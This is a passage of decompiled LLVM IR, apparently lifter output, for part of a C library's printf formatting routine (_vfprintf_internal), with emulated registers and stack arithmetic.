  %v0_805132b = phi i32 [ %arg3, %entry ], [ %v0_805131e, %dec_label_pc_805131e ]
  %tmp24 = icmp slt i32 %v0_805132b, 1
  br i1 %tmp24, label %dec_label_pc_8051338, label %dec_label_pc_8051326

dec_label_pc_8051326:                             ; preds = %dec_label_pc_8051320
  %v0_8051326 = load i32, i32* @ecx, align 4
  %v5_8051330 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_805132b, i32 %arg1, i32 %v0_8051326)
  br label %dec_label_pc_8051338

dec_label_pc_8051338:                             ; preds = %dec_label_pc_8051320, %dec_label_pc_8051326
  %v1_8051338 = phi i32 [ 0, %dec_label_pc_8051320 ], [ %v5_8051330, %dec_label_pc_8051326 ]
  %v0_8051338 = load i32, i32* @ebp, align 4
  %v2_8051338 = add i32 %v0_8051338, %v1_8051338
  br label %dec_label_pc_805133a

dec_label_pc_805133a:                             ; preds = %dec_label_pc_8051308, %dec_label_pc_8051338
  %v0_805133d = phi i32 [ %v0_8051313, %dec_label_pc_8051308 ], [ %v2_8051338, %dec_label_pc_8051338 ]
  ret i32 %v0_805133d

; uselistorder directives
  uselistorder i32 %v0_805132b, { 1, 0 }
  uselistorder i32 %v0_8051313, { 1, 0, 2 }
  uselistorder i32 %v1_8051308, { 1, 0 }
  uselistorder i32 %v2_8051300, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805133a, { 1, 0 }
  uselistorder label %dec_label_pc_8051338, { 1, 0 }
  uselistorder label %dec_label_pc_8051320, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_805134e = ptrtoint i8* %arg2 to i32
  store i32 %v4_805134e, i32* @ebx, align 4
  %v2_8051356 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_8051356, i32* @esi, align 4
  %v5_805135b = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_805134e)
  store i32 %v5_805135b, i32* %eax.global-to-local, align 4
  %v2_8051363 = icmp slt i32 %v5_805135b, 0
  %v1_8051365 = icmp eq i1 %v2_8051363, false
  br i1 %v1_8051365, label %dec_label_pc_80513a5, label %dec_label_pc_8051367

dec_label_pc_8051367:                             ; preds = %entry
  %v3_8051367 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_8051367, i32* @ebx, align 4
  %v5_805136e = inttoptr i32 %v3_8051367 to i8*
  %v3_805136f = call i32 @strlen(i8* %v5_805136e)
  store i32 %v3_805136f, i32* %eax.global-to-local, align 4
  %v1_8051377 = icmp eq i32 %v3_805136f, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_8051377, label %dec_label_pc_80518de, label %dec_label_pc_8051386

dec_label_pc_8051386:                             ; preds = %dec_label_pc_8051367
  %v0_8051386 = load i32, i32* @edx, align 4
  %v0_805138f = load i32, i32* @ebx, align 4
  %v6_8051390 = call i32 @__stdio_fwrite(i32 %v0_805138f, i32 %v3_805136f, i32 %arg1, i32 %v0_8051386)
  store i32 %v6_8051390, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_80518de

dec_label_pc_80513a5:                             ; preds = %entry
  %v6_80513af = call i32 @_ppfs_prepargs(i32 %v2_8051356, i32 %arg3, i32 %v5_805135b, i32 %v5_805135b)
  store i32 %v6_80513af, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_80513bc = load i32, i32* @ebx, align 4
  store i32 %v0_80513bc, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80513c4

dec_label_pc_80513c3:                             ; preds = %dec_label_pc_80513ca
  %v1_80513c3 = add i32 %v0_80513d2, 1
  store i32 %v1_80513c3, i32* @ebx, align 4
  br label %dec_label_pc_80513c4.backedge

dec_label_pc_80513c4.backedge:                    ; preds = %dec_label_pc_80513c3, %dec_label_pc_80518c4, %dec_label_pc_80518cf
  %v1_80513ce20 = phi i32 [ %v1_80513d6, %dec_label_pc_80513c3 ], [ %v3_80518c4, %dec_label_pc_80518c4 ], [ %v1_8051402, %dec_label_pc_80518cf ]
  %v0_80513c418 = phi i32 [ %v1_80513c3, %dec_label_pc_80513c3 ], [ %v3_80518c4, %dec_label_pc_80518c4 ], [ %v1_80518cf, %dec_label_pc_80518cf ]
  %v4_80513c4.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513c4

dec_label_pc_80513c4:                             ; preds = %dec_label_pc_80513c4.backedge, %dec_label_pc_80513a5
  %v1_80513d6 = phi i32 [ %v1_80513ce20, %dec_label_pc_80513c4.backedge ], [ %v0_80513bc, %dec_label_pc_80513a5 ]
  %v0_80513d2 = phi i32 [ %v0_80513c418, %dec_label_pc_80513c4.backedge ], [ %v0_80513bc, %dec_label_pc_80513a5 ]
  %v4_80513c4 = phi i32 [ %v4_80513c4.pre, %dec_label_pc_80513c4.backedge ], [ %v6_80513af, %dec_label_pc_80513a5 ]
  %v1_80513c4 = inttoptr i32 %v0_80513d2 to i8*
  %v2_80513c4 = load i8, i8* %v1_80513c4, align 1
  %v3_80513c4 = zext i8 %v2_80513c4 to i32
  %v5_80513c4 = and i32 %v4_80513c4, -256
  %v6_80513c4 = or i32 %v3_80513c4, %v5_80513c4
  store i32 %v6_80513c4, i32* %eax.global-to-local, align 4
  %v4_80513c6 = icmp eq i8 %v2_80513c4, 0
  br i1 %v4_80513c6, label %dec_label_pc_80513ce, label %dec_label_pc_80513ca

dec_label_pc_80513ca:                             ; preds = %dec_label_pc_80513c4
  %v10_80513ca = icmp eq i8 %v2_80513c4, 37
  %v1_80513cc = icmp eq i1 %v10_80513ca, false
  br i1 %v1_80513cc, label %dec_label_pc_80513c3, label %dec_label_pc_80513ce

dec_label_pc_80513ce:                             ; preds = %dec_label_pc_80513ca, %dec_label_pc_80513c4
  %v2_80513ce = sub i32 %v0_80513d2, %v1_80513d6
  %v12_80513ce = icmp eq i32 %v2_80513ce, 0
  br i1 %v12_80513ce, label %dec_label_pc_80513f9, label %dec_label_pc_80513d2

dec_label_pc_80513d2:                             ; preds = %dec_label_pc_80513ce
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_80513ce, i32* @esi, align 4
  %tmp67 = icmp slt i32 %v2_80513ce, 1
  br i1 %tmp67, label %dec_label_pc_80513ee, label %dec_label_pc_80513dc

dec_label_pc_80513dc:                             ; preds = %dec_label_pc_80513d2
  %v0_80513dc = load i32, i32* @ebp, align 4
  %v1_80513dc = load i32, i32* @esp, align 4
  %v2_80513dc = add i32 %v1_80513dc, -4
  %v3_80513dc = inttoptr i32 %v2_80513dc to i32*
  store i32 %v0_80513dc, i32* %v3_80513dc, align 4
  %v1_80513dd = add i32 %v1_80513dc, 368
  %v2_80513dd = inttoptr i32 %v1_80513dd to i32*
  %v3_80513dd = load i32, i32* %v2_80513dd, align 4
  %v5_80513dd = add i32 %v1_80513dc, -8
  %v6_80513dd = inttoptr i32 %v5_80513dd to i32*
  store i32 %v3_80513dd, i32* %v6_80513dd, align 4
  %v0_80513e4 = load i32, i32* @esi, align 4
  %v2_80513e4 = add i32 %v1_80513dc, -12
  %v3_80513e4 = inttoptr i32 %v2_80513e4 to i32*
  store i32 %v0_80513e4, i32* %v3_80513e4, align 4
  %v0_80513e5 = load i32, i32* %edx.global-to-local, align 4
  %v2_80513e5 = add i32 %v1_80513dc, -16
  %v3_80513e5 = inttoptr i32 %v2_80513e5 to i32*
  store i32 %v0_80513e5, i32* %v3_80513e5, align 4
  %v0_80513e6 = load i32, i32* %stack_var_-364, align 4
  %v4_80513e6 = call i32 @__stdio_fwrite(i32 %v0_80513e6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80513e6, i32* %eax.global-to-local, align 4
  %v1_80513ee.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80513ee

dec_label_pc_80513ee:                             ; preds = %dec_label_pc_80513d2, %dec_label_pc_80513dc
  %v3_80513f6 = phi i32 [ %v2_80513ce, %dec_label_pc_80513d2 ], [ %v1_80513ee.pre, %dec_label_pc_80513dc ]
  %v0_80513ee = phi i32 [ 0, %dec_label_pc_80513d2 ], [ %v4_80513e6, %dec_label_pc_80513dc ]
  %v12_80513ee = icmp eq i32 %v0_80513ee, %v3_80513f6
  %v1_80513f0 = icmp eq i1 %v12_80513ee, false
  %v0_80518d7.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_80513f0, label %dec_label_pc_80518d7, label %dec_label_pc_80513f6

dec_label_pc_80513f6:                             ; preds = %dec_label_pc_80513ee
  %v1_80513f6 = inttoptr i32 %v0_80518d7.pre.pre to i32*
  %v2_80513f6 = load i32, i32* %v1_80513f6, align 4
  %v4_80513f6 = add i32 %v2_80513f6, %v3_80513f6
  store i32 %v4_80513f6, i32* %v1_80513f6, align 4
  %v0_80513f9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80513f9

dec_label_pc_80513f9:                             ; preds = %dec_label_pc_80513ce, %dec_label_pc_80513f6
  %v0_80518cf = phi i32 [ %v0_80513d2, %dec_label_pc_80513ce ], [ %v0_80513f9.pre, %dec_label_pc_80513f6 ]
  %v1_80513f9 = inttoptr i32 %v0_80518cf to i8*
  %v2_80513f9 = load i8, i8* %v1_80513f9, align 1
  %v3_80513f9 = icmp eq i8 %v2_80513f9, 0
  br i1 %v3_80513f9, label %dec_label_pc_80518de, label %dec_label_pc_8051402

dec_label_pc_8051402:                             ; preds = %dec_label_pc_80513f9
  %v1_8051402 = add i32 %v0_80518cf, 1
  store i32 %v1_8051402, i32* %edx.global-to-local, align 4
  %v2_8051405 = inttoptr i32 %v1_8051402 to i8*
  %v3_8051405 = load i8, i8* %v2_8051405, align 1
  %v12_8051405 = icmp eq i8 %v3_8051405, 37
  br i1 %v12_8051405, label %dec_label_pc_80518cf, label %dec_label_pc_805140f

dec_label_pc_805140f:                             ; preds = %dec_label_pc_8051402
  %v1_805140f = load i32, i32* @esp, align 4
  %v2_805140f = add i32 %v1_805140f, 16
  %v3_805140f = inttoptr i32 %v2_805140f to i32*
  store i32 %v1_8051402, i32* %v3_805140f, align 4
  %v0_8051413 = load i32, i32* @esp, align 4
  %v1_8051413 = add i32 %v0_8051413, 340
  %v2_8051413 = inttoptr i32 %v1_8051413 to i32*
  store i32 0, i32* %v2_8051413, align 4
  %v0_805141e = load i32, i32* @esp, align 4
  %v1_8051421 = add i32 %v0_805141e, 16
  store i32 %v1_8051421, i32* @ebx, align 4
  %v2_8051425 = add i32 %v0_805141e, -16
  %v3_8051425 = inttoptr i32 %v2_8051425 to i32*
  store i32 %v1_8051421, i32* %v3_8051425, align 4
  %v0_8051426 = load i32, i32* %stack_var_-364, align 4
  %v1_8051426 = inttoptr i32 %v0_8051426 to i32*
  %v2_8051426 = call i32 @_ppfs_parsespec(i32* %v1_8051426)
  store i32 %v2_8051426, i32* %eax.global-to-local, align 4
  %v0_805142b = load i32, i32* @ebx, align 4
  %v1_805142b = load i32, i32* @esp, align 4
  %v2_805142b = inttoptr i32 %v1_805142b to i32*
  store i32 %v0_805142b, i32* %v2_805142b, align 4
  %v0_805142e = load i32, i32* %stack_var_-364, align 4
  %v1_805142e = call i32 @_ppfs_setargs(i32 %v0_805142e)
  store i32 %v1_805142e, i32* %eax.global-to-local, align 4
  %v0_8051433 = load i32, i32* @esp, align 4
  %v1_8051433 = add i32 %v0_8051433, 70
  %v2_8051433 = inttoptr i32 %v1_8051433 to i8*
  %v3_8051433 = load i8, i8* %v2_8051433, align 1
  %v4_8051433 = zext i8 %v3_8051433 to i32
  store i32 %v4_8051433, i32* @edi, align 4
  %v1_8051438 = add i32 %v0_8051433, 16
  %v1_805143b = add i32 %v0_8051433, 56
  %v2_805143b = inttoptr i32 %v1_805143b to i32*
  %v3_805143b = load i32, i32* %v2_805143b, align 4
  %v1_8051440 = add i32 %v0_8051433, 112
  store i32 %v1_8051440, i32* %edx.global-to-local, align 4
  %tmp68 = icmp slt i32 %v3_805143b, 1
  br i1 %tmp68, label %dec_label_pc_805144d, label %dec_label_pc_8051446

dec_label_pc_8051446:                             ; preds = %dec_label_pc_805140f
  %v2_8051446 = zext i8 %v3_8051433 to i32
  %v3_8051446 = mul nuw nsw i32 %v2_8051446, 12
  store i32 %v3_8051446, i32* %eax.global-to-local, align 4
  %v2_8051449 = add i32 %v0_8051433, 100
  %v3_8051449 = add i32 %v2_8051449, %v3_8051446
  store i32 %v3_8051449, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805144d

dec_label_pc_805144d:                             ; preds = %dec_label_pc_805140f, %dec_label_pc_8051446
  %v0_805145528 = phi i32 [ %v1_8051440, %dec_label_pc_805140f ], [ %v3_8051449, %dec_label_pc_8051446 ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805144f = add i32 %v0_8051433, 60
  %v2_805144f = inttoptr i32 %v1_805144f to i32*
  %v3_805144f = load i32, i32* %v2_805144f, align 4
  store i32 %v3_805144f, i32* %ecx.global-to-local, align 4
  %v2_805146081 = sub i32 0, %v3_805144f
  %v10_805146084 = and i32 %v3_805144f, %v2_805146081
  %v11_805146085 = icmp slt i32 %v10_805146084, 0
  %v13_805146086 = icmp slt i32 %v2_805146081, 0
  %v2_805146287 = icmp eq i1 %v13_805146086, %v11_805146085
  br i1 %v2_805146287, label %dec_label_pc_8051464, label %dec_label_pc_8051455

dec_label_pc_8051455:                             ; preds = %dec_label_pc_805144d, %dec_label_pc_8051455
  %v0_805146491 = phi i32 [ %v0_8051464, %dec_label_pc_8051455 ], [ %v1_8051438, %dec_label_pc_805144d ]
  %v2_805145590 = phi i32 [ %v1_805145f, %dec_label_pc_8051455 ], [ 0, %dec_label_pc_805144d ]
  %v0_805145589 = phi i32 [ %v1_805145c, %dec_label_pc_8051455 ], [ %v0_805145528, %dec_label_pc_805144d ]
  %v3_8051455 = mul i32 %v2_805145590, 4
  %v4_8051455 = add i32 %v0_805146491, 344
  %v5_8051455 = add i32 %v4_8051455, %v3_8051455
  %v6_8051455 = inttoptr i32 %v5_8051455 to i32*
  store i32 %v0_805145589, i32* %v6_8051455, align 4
  %v0_805145c = load i32, i32* %edx.global-to-local, align 4
  %v1_805145c = add i32 %v0_805145c, 12
  store i32 %v1_805145c, i32* %edx.global-to-local, align 4
  %v0_805145f = load i32, i32* %eax.global-to-local, align 4
  %v1_805145f = add i32 %v0_805145f, 1
  store i32 %v1_805145f, i32* %eax.global-to-local, align 4
  %v1_8051460.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051460 = sub i32 %v1_805145f, %v1_8051460.pre
  %v8_8051460 = xor i32 %v1_805145f, %v1_8051460.pre
  %v9_8051460 = xor i32 %v2_8051460, %v1_805145f
  %v10_8051460 = and i32 %v9_8051460, %v8_8051460
  %v11_8051460 = icmp slt i32 %v10_8051460, 0
  %v13_8051460 = icmp slt i32 %v2_8051460, 0
  %v2_8051462 = icmp eq i1 %v13_8051460, %v11_8051460
  %v0_8051464 = load i32, i32* @esp, align 4
  br i1 %v2_8051462, label %dec_label_pc_8051464, label %dec_label_pc_8051455

dec_label_pc_8051464:                             ; preds = %dec_label_pc_8051455, %dec_label_pc_805144d
  %v0_8051464.lcssa = phi i32 [ %v1_8051438, %dec_label_pc_805144d ], [ %v0_8051464, %dec_label_pc_8051455 ]
  %v1_8051464 = add i32 %v0_8051464.lcssa, 48
  %v2_8051464 = inttoptr i32 %v1_8051464 to i32*
  %v3_8051464 = load i32, i32* %v2_8051464, align 4
  store i32 %v3_8051464, i32* @ecx, align 4
  %v1_8051468 = icmp eq i32 %v3_8051464, 0
  %v1_805146a = icmp eq i1 %v1_8051468, false
  br i1 %v1_805146a, label %dec_label_pc_8051492, label %dec_label_pc_805146c

dec_label_pc_805146c:                             ; preds = %dec_label_pc_8051464
  %v1_805146c = inttoptr i32 %v0_8051464.lcssa to i32*
  %v2_805146c = load i32, i32* %v1_805146c, align 4
  store i32 %v2_805146c, i32* %eax.global-to-local, align 4
  %v1_805146f = ashr i32 %v2_805146c, 31
  store i32 %v1_805146f, i32* %edx.global-to-local, align 4
  %v2_8051470 = add i32 %v0_8051464.lcssa, -4
  %v3_8051470 = inttoptr i32 %v2_8051470 to i32*
  store i32 %v1_805146f, i32* %v3_8051470, align 4
  %v0_8051471 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051471 = add i32 %v0_8051464.lcssa, -8
  %v3_8051471 = inttoptr i32 %v2_8051471 to i32*
  store i32 %v0_8051471, i32* %v3_8051471, align 4
  %v1_8051472 = add i32 %v0_8051464.lcssa, 32
  %v2_8051472 = inttoptr i32 %v1_8051472 to i32*
  %v3_8051472 = load i32, i32* %v2_8051472, align 4
  %v1_8051476 = and i32 %v3_8051472, 3840
  store i32 %v1_8051476, i32* %eax.global-to-local, align 4
  %v2_805147b = add i32 %v0_8051464.lcssa, -12
  %v3_805147b = inttoptr i32 %v2_805147b to i32*
  store i32 %v1_8051476, i32* %v3_805147b, align 4
  %v1_805147c = add i32 %v0_8051464.lcssa, 344
  %v2_805147c = inttoptr i32 %v1_805147c to i32*
  %v3_805147c = load i32, i32* %v2_805147c, align 4
  store i32 %v3_805147c, i32* %eax.global-to-local, align 4
  %v1_8051483 = inttoptr i32 %v3_805147c to i32*
  %v2_8051483 = load i32, i32* %v1_8051483, align 4
  %v4_8051483 = add i32 %v0_8051464.lcssa, -16
  %v5_8051483 = inttoptr i32 %v4_8051483 to i32*
  store i32 %v2_8051483, i32* %v5_8051483, align 4
  %v0_8051485 = call i32 @_store_inttype()
  store i32 %v0_8051485, i32* %eax.global-to-local, align 4
  %v0_805148a = load i32, i32* @esp, align 4
  %v1_805148a = add i32 %v0_805148a, 16
  br label %dec_label_pc_80518c4

dec_label_pc_8051492:                             ; preds = %dec_label_pc_8051464
  %tmp94 = icmp ult i32 %v3_8051464, 8
  br i1 %tmp94, label %dec_label_pc_805149b, label %dec_label_pc_80515fc

dec_label_pc_805149b:                             ; preds = %dec_label_pc_8051492
  %v1_805149b = add i32 %v3_8051464, 134584400
  %v2_805149b = inttoptr i32 %v1_805149b to i8*
  %v3_805149b = load i8, i8* %v2_805149b, align 1
  %v4_805149b = sext i8 %v3_805149b to i32
  store i32 %v4_805149b, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_80514a7 = icmp eq i8 %v3_805149b, 10
  %v1_80514aa = icmp eq i1 %v9_80514a7, false
  br i1 %v1_80514aa, label %dec_label_pc_80514c8, label %dec_label_pc_80514ac

dec_label_pc_80514ac:                             ; preds = %dec_label_pc_805149b
  %v1_80514ac = add i32 %v0_8051464.lcssa, 32
  %v2_80514ac = inttoptr i32 %v1_80514ac to i32*
  %v3_80514ac = load i32, i32* %v2_80514ac, align 4
  %v1_80514b2 = and i32 %v3_80514ac, 32
  store i32 %v1_80514b2, i32* %eax.global-to-local, align 4
  %tmp69 = udiv i32 %v1_80514b2, 32
  %tmp70 = sub nsw i32 45, %tmp69
  store i32 %tmp70, i32* @ebx, align 4
  %v1_80514c0 = trunc i32 %v3_80514ac to i8
  %v2_80514c0 = and i8 %v1_80514c0, 64
  %v3_80514c0 = icmp eq i8 %v2_80514c0, 0
  %v5_80514c0 = zext i8 %v2_80514c0 to i32
  %v7_80514c0 = and i32 %v3_80514ac, -256
  %v8_80514c0 = or i32 %v5_80514c0, %v7_80514c0
  store i32 %v8_80514c0, i32* %edx.global-to-local, align 4
  br i1 %v3_80514c0, label %dec_label_pc_80514c8, label %dec_label_pc_80514c5

dec_label_pc_80514c5:                             ; preds = %dec_label_pc_80514ac
  %v2_80514c5 = or i32 %tmp70, 128
  store i32 %v2_80514c5, i32* @ebx, align 4
  br label %dec_label_pc_80514c8

dec_label_pc_80514c8:                             ; preds = %dec_label_pc_80514ac, %dec_label_pc_805149b, %dec_label_pc_80514c5
  %tmp95 = icmp ult i32 %v3_8051464, 6
  br i1 %tmp95, label %dec_label_pc_80514cd, label %dec_label_pc_80514e5

dec_label_pc_80514cd:                             ; preds = %dec_label_pc_80514c8
  %v9_80514cd = icmp eq i32 %v3_8051464, 3
  %v1_80514d0 = icmp eq i1 %v9_80514cd, false
  br i1 %v1_80514d0, label %dec_label_pc_80514d9, label %dec_label_pc_80514d2

dec_label_pc_80514d2:                             ; preds = %dec_label_pc_80514cd
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_80514e7

dec_label_pc_80514d9:                             ; preds = %dec_label_pc_80514cd
  %v9_80514de = icmp eq i32 %v3_8051464, 1
  br i1 %v9_80514de, label %dec_label_pc_80514ec, label %dec_label_pc_80514e7

dec_label_pc_80514e5:                             ; preds = %dec_label_pc_80514c8
  %v1_80514e5 = sub nsw i32 0, %v4_805149b
  store i32 %v1_80514e5, i32* @esi, align 4
  br label %dec_label_pc_80514e7

dec_label_pc_80514e7:                             ; preds = %dec_label_pc_80514d9, %dec_label_pc_80514d2, %dec_label_pc_80514e5
  br label %dec_label_pc_80514ec

dec_label_pc_80514ec:                             ; preds = %dec_label_pc_80514d9, %dec_label_pc_80514e7
  %storemerge106 = phi i32 [ 11, %dec_label_pc_80514e7 ], [ 6, %dec_label_pc_80514d9 ]
  store i32 %storemerge106, i32* @ebp, align 4
  %v1_80514ec = add i32 %v0_8051464.lcssa, 7
  %v2_80514ec = inttoptr i32 %v1_80514ec to i8*
  store i8 32, i8* %v2_80514ec, align 1
  %v0_80514f1 = load i32, i32* @esp, align 4
  %v1_80514f1 = add i32 %v0_80514f1, 20
  %v2_80514f1 = inttoptr i32 %v1_80514f1 to i32*
  %v3_80514f1 = load i32, i32* %v2_80514f1, align 4
  %v5_80514f1 = icmp slt i32 %v3_80514f1, 0
  %v1_80514f6 = icmp eq i1 %v5_80514f1, false
  br i1 %v1_80514f6, label %dec_label_pc_8051500, label %dec_label_pc_80514f8

dec_label_pc_80514f8:                             ; preds = %dec_label_pc_80514ec
  %v1_80514f8 = add i32 %v0_80514f1, 36
  %v2_80514f8 = inttoptr i32 %v1_80514f8 to i8*
  %v3_80514f8 = load i8, i8* %v2_80514f8, align 1
  %v4_80514f8 = zext i8 %v3_80514f8 to i32
  %v5_80514f8 = load i32, i32* %edx.global-to-local, align 4
  %v6_80514f8 = and i32 %v5_80514f8, -256
  %v7_80514f8 = or i32 %v6_80514f8, %v4_80514f8
  store i32 %v7_80514f8, i32* %edx.global-to-local, align 4
  %v3_80514fc = add i32 %v0_80514f1, 7
  %v4_80514fc = inttoptr i32 %v3_80514fc to i8*
  store i8 %v3_80514f8, i8* %v4_80514fc, align 1
  %v0_8051500.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051500

dec_label_pc_8051500:                             ; preds = %dec_label_pc_80514ec, %dec_label_pc_80514f8
  %v1_8051519 = phi i32 [ %v0_80514f1, %dec_label_pc_80514ec ], [ %v0_8051500.pre, %dec_label_pc_80514f8 ]
  %v1_8051500 = add i32 %v1_8051519, 344
  %v2_8051500 = inttoptr i32 %v1_8051500 to i32*
  %v3_8051500 = load i32, i32* %v2_8051500, align 4
  store i32 %v3_8051500, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_805150c = add i32 %v3_8051464, -1
  %v8_805150c = icmp eq i32 %v1_805150c, 0
  store i32 %v1_805150c, i32* %ecx.global-to-local, align 4
  %v0_8051519.pre = load i32, i32* @edi, align 4
  br i1 %v8_805150c, label %dec_label_pc_8051519, label %dec_label_pc_805150f

dec_label_pc_805150f:                             ; preds = %dec_label_pc_8051500
  %v2_805150f = mul i32 %v0_8051519.pre, 4
  %v3_805150f = add i32 %v1_8051519, 52
  %v4_805150f = add i32 %v3_805150f, %v2_805150f
  %v5_805150f = inttoptr i32 %v4_805150f to i32*
  %v6_805150f = load i32, i32* %v5_805150f, align 4
  %v1_8051513 = and i32 %v6_805150f, 3840
  store i32 %v1_8051513, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051519

dec_label_pc_8051519:                             ; preds = %dec_label_pc_8051500, %dec_label_pc_805150f
  %v2_8051519 = add i32 %v1_8051519, -4
  %v3_8051519 = inttoptr i32 %v2_8051519 to i32*
  store i32 %v0_8051519.pre, i32* %v3_8051519, align 4
  %v0_805151a = load i32, i32* @esi, align 4
  %v2_805151a = add i32 %v1_8051519, -8
  %v3_805151a = inttoptr i32 %v2_805151a to i32*
  store i32 %v0_805151a, i32* %v3_805151a, align 4
  %v0_805151b = load i32, i32* %eax.global-to-local, align 4
  %v2_805151b = add i32 %v1_8051519, -12
  %v3_805151b = inttoptr i32 %v2_805151b to i32*
  store i32 %v0_805151b, i32* %v3_805151b, align 4
  %v0_805151c = load i32, i32* %edx.global-to-local, align 4
  %v2_805151c = add i32 %v1_8051519, -16
  %v3_805151c = inttoptr i32 %v2_805151c to i32*
  store i32 %v0_805151c, i32* %v3_805151c, align 4
  %v0_805151d = call i32 @_load_inttype()
  %v0_8051522 = load i32, i32* @ebx, align 4
  %v1_8051522 = load i32, i32* @esp, align 4
  %v2_8051522 = inttoptr i32 %v1_8051522 to i32*
  store i32 %v0_8051522, i32* %v2_8051522, align 4
  %v0_8051525 = load i32, i32* @esi, align 4
  %v1_8051525 = load i32, i32* @esp, align 4
  %v2_8051525 = add i32 %v1_8051525, -4
  %v3_8051525 = inttoptr i32 %v2_8051525 to i32*
  store i32 %v0_8051525, i32* %v3_8051525, align 4
  %v0_8051526 = load i32, i32* @edx, align 4
  %v2_8051526 = add i32 %v1_8051525, -8
  %v3_8051526 = inttoptr i32 %v2_8051526 to i32*
  store i32 %v0_8051526, i32* %v3_8051526, align 4
  %v2_8051527 = add i32 %v1_8051525, -12
  %v3_8051527 = inttoptr i32 %v2_8051527 to i32*
  store i32 %v0_805151d, i32* %v3_8051527, align 4
  %v1_8051528 = add i32 %v1_8051525, 347
  store i32 %v1_8051528, i32* %eax.global-to-local, align 4
  %v2_805152f = add i32 %v1_8051525, -16
  %v3_805152f = inttoptr i32 %v2_805152f to i32*
  store i32 %v1_8051528, i32* %v3_805152f, align 4
  %v0_8051530 = load i32, i32* %stack_var_-364, align 4
  %v5_8051530 = inttoptr i32 %v0_8051530 to i8*
  %v6_8051530 = call i32 @_uintmaxtostr(i8* %v5_8051530, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8051530, i32* %eax.global-to-local, align 4
  %v0_8051535 = load i32, i32* @esp, align 4
  %v1_8051535 = add i32 %v0_8051535, 32
  store i32 %v6_8051530, i32* @edi, align 4
  %v1_805153a = add i32 %v0_8051535, 80
  %v2_805153a = inttoptr i32 %v1_805153a to i32*
  %v3_805153a = load i32, i32* %v2_805153a, align 4
  %tmp96 = icmp ult i32 %v3_805153a, 6
  br i1 %tmp96, label %dec_label_pc_8051568, label %dec_label_pc_8051541

dec_label_pc_8051541:                             ; preds = %dec_label_pc_8051519
  %v1_8051541 = inttoptr i32 %v6_8051530 to i8*
  %v2_8051541 = load i8, i8* %v1_8051541, align 1
  %v11_8051541 = icmp eq i8 %v2_8051541, 45
  %v1_8051544 = icmp eq i1 %v11_8051541, false
  %v1_8051553 = add i32 %v0_8051535, 64
  %v2_8051553 = inttoptr i32 %v1_8051553 to i32*
  %v3_8051553 = load i32, i32* %v2_8051553, align 4
  br i1 %v1_8051544, label %dec_label_pc_8051553, label %dec_label_pc_8051546

dec_label_pc_8051546:                             ; preds = %dec_label_pc_8051541
  %v4_8051546 = or i32 %v3_8051553, 2
  store i32 %v4_8051546, i32* %v2_8051553, align 4
  %v0_805154b = load i32, i32* @edi, align 4
  %v1_805154b = add i32 %v0_805154b, 1
  store i32 %v1_805154b, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_8051568.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051568

dec_label_pc_8051553:                             ; preds = %dec_label_pc_8051541
  store i32 %v3_8051553, i32* %eax.global-to-local, align 4
  %v2_8051557 = and i32 %v3_8051553, 2
  %v3_8051557 = icmp eq i32 %v2_8051557, 0
  br i1 %v3_8051557, label %dec_label_pc_805155f, label %dec_label_pc_805155b

dec_label_pc_805155b:                             ; preds = %dec_label_pc_8051553
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8051568

dec_label_pc_805155f:                             ; preds = %dec_label_pc_8051553
  %v2_805155f = urem i32 %v3_8051553, 2
  %v3_805155f = icmp eq i32 %v2_805155f, 0
  br i1 %v3_805155f, label %dec_label_pc_8051568, label %dec_label_pc_8051563

dec_label_pc_8051563:                             ; preds = %dec_label_pc_805155f
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_8051568

dec_label_pc_8051568:                             ; preds = %dec_label_pc_805155f, %dec_label_pc_8051519, %dec_label_pc_805155b, %dec_label_pc_8051546, %dec_label_pc_8051563
  %v0_80515bb = phi i32 [ %v6_8051530, %dec_label_pc_805155f ], [ %v6_8051530, %dec_label_pc_8051519 ], [ %v6_8051530, %dec_label_pc_805155b ], [ %v1_805154b, %dec_label_pc_8051546 ], [ %v6_8051530, %dec_label_pc_8051563 ]
